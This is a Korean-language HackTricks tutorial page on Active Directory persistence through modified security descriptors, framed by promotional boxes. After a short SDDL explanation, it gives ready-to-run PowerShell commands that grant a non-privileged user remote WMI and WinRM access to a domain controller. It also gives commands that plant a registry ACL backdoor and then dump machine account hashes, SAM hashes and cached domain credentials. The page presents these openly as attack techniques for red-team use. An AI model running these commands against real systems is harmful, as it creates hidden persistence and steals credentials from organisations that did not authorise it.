# 보안 기술자

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 PR을 제출하세요.**

</details>

## 보안 기술자

[문서에서](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) 보안 기술자 정의 언어(SDDL)는 보안 기술자를 설명하는 데 사용되는 형식을 정의합니다. SDDL은 DACL 및 SACL에 ACE 문자열을 사용합니다: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**보안 기술자**는 **객체**가 **객체**에 대해 **가지는 권한**을 **저장**하는 데 사용됩니다. 객체의 보안 기술자를 약간 변경하면 특권 그룹의 구성원이 아니어도 해당 객체에 대해 매우 흥미로운 권한을 얻을 수 있습니다.

따라서 이 지속성 기술은 특정 객체에 필요한 모든 특권을 얻을 수 있는 능력에 기반하여 일반적으로 관리자 권한이 필요한 작업을 관리자 권한 없이 수행할 수 있습니다.

### WMI에 대한 액세스

사용자에게 **원격으로 WMI 실행 권한**을 부여할 수 있습니다. [**여기에서**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1) 확인하세요:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRM에 대한 액세스

[이 링크](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)를 사용하여 **사용자에게 winrm PS 콘솔에 대한 액세스를 제공**합니다.
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### 해시에 대한 원격 액세스

레지스트리에 액세스하여 해시를 덤프하고 [DAMP](https://github.com/HarmJ0y/DAMP)를 사용하여 Reg 백도어를 생성하여 컴퓨터의 해시, SAM 및 컴퓨터에 캐시된 AD 자격 증명을 언제든지 검색할 수 있습니다. 따라서 도메인 컨트롤러 컴퓨터에 대해 일반 사용자에게 이 권한을 부여하는 것이 매우 유용합니다:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
[**Silver Tickets**](silver-ticket.md)에서는 도메인 컨트롤러의 컴퓨터 계정의 해시를 사용하는 방법을 알아볼 수 있습니다.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
